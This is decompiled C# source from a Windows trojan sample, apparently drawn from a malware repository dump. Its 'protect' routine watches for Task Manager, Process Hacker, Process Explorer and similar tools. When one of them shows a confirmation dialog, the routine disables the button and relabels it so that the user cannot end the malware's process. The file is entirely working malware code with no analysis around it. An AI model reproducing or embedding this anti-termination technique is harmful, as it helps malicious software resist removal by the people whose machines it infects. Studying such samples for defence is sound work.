// Decompiled with JetBrains decompiler
// Type: w.mgr
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 87AD811B-6569-4042-88FE-555CF9409655
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-ff65a8d77ade37fae5f4caccfcf172f26534647c1deae8731ff374a48038d9e8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace w
{
  public class mgr
  {
    private List<IntPtr> CLD;

    public mgr() => this.CLD = new List<IntPtr>();

    [DllImport("user32.dll")]
    private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetClassName(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, int nMaxCount);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowTextLength(int hwnd);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int EnumChildWindows(
      IntPtr hWnd,
      mgr.EnumWindProc lpEnumFunc,
      ref IntPtr lParam);

    private bool EnumChild(int hWnd, int lParam)
    {
      this.CLD.Add((IntPtr) hWnd);
      return true;
    }

    public void protect()
    {
      while (true)
      {
        Thread.Sleep(200);
        IntPtr foregroundWindow = mgr.GetForegroundWindow();
        if (foregroundWindow.ToInt32() != 0)
        {
          int lpdwProcessID = 0;
          mgr.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
          if (lpdwProcessID > 0)
          {
            int windowTextLength = mgr.GetWindowTextLength((int) foregroundWindow);
            string str1;
            if (windowTextLength == 0)
            {
              str1 = "";
            }
            else
            {
              StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
              str1 = mgr.GetWindowText((int) foregroundWindow, lpString, lpString.Capacity) != 0 ? lpString.ToString() : "";
            }
            Process processById = Process.GetProcessById(lpdwProcessID);
            if (Operators.CompareString(processById.ProcessName.ToLower(), "taskmgr", false) == 0 | Operators.CompareString(processById.ProcessName.ToLower(), "processviewer", false) == 0 | Operators.CompareString(processById.ProcessName.ToLower(), "processhacker", false) == 0 | Operators.CompareString(str1.ToLower(), "process explorer", false) == 0)
            {
              List<IntPtr> numList = new List<IntPtr>();
              int num = 0;
              IntPtr[] child = this.GetChild(foregroundWindow);
              int index = 0;
              while (index < child.Length)
              {
                IntPtr hwnd = child[index];
                string lpClassName = Strings.Space(200);
                int className = mgr.GetClassName((int) hwnd, ref lpClassName, 200);
                string str2 = lpClassName.Remove(className, checked (200 - className));
                if (Operators.CompareString(str2.ToLower(), "button", false) == 0)
                  numList.Add(hwnd);
                if (Operators.CompareString(str2.ToLower(), "static", false) == 0 | Operators.CompareString(str2.ToLower(), "directuihwnd", false) == 0)
                  checked { ++num; }
                checked { ++index; }
              }
              if (numList.Count == 2 & (num == 2 | num == 1))
              {
                mgr.EnableWindow(numList[0], false);
                int hwnd = (int) numList[0];
                string str3 = "End process";
                ref string local = ref str3;
                mgr.SendMessage(hwnd, 12, 0, ref local);
              }
            }
          }
        }
      }
    }

    private IntPtr[] GetChild(IntPtr hwd)
    {
      lock (this)
      {
        this.CLD.Clear();
        IntPtr hWnd = hwd;
        mgr.EnumWindProc lpEnumFunc = new mgr.EnumWindProc(this.EnumChild);
        IntPtr num = (IntPtr) 0;
        ref IntPtr local = ref num;
        mgr.EnumChildWindows(hWnd, lpEnumFunc, ref local);
        return this.CLD.ToArray();
      }
    }

    private delegate bool EnumWindProc(int hWnd, int lParam);

    private delegate bool EnumChildWindProc(int hWnd, int lParam);
  }
}
